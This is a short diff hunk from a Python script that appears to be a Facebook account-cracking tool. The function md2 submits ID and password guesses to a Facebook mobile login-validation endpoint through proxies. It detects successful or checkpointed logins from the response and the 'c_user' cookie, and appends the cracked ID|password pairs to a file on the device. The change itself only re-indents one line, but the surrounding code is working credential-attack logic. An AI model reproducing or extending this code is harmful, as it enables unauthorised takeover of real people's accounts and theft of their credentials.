@@ -331,7 +331,7 @@ def md2(idf,pwv):
       po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)       
       if 'y' in cp_xdx:
          print(f'\r\x1b[38;5;208m [Asdel-Cp] {idf}|{pw}{xxx}')
-        open('/sdcard/XYTEEE-XC-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
+         open('/sdcard/XYTEEE-XC-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
         cp+=1
         break
       elif "c_user" in ses.cookies.get_dict().keys():
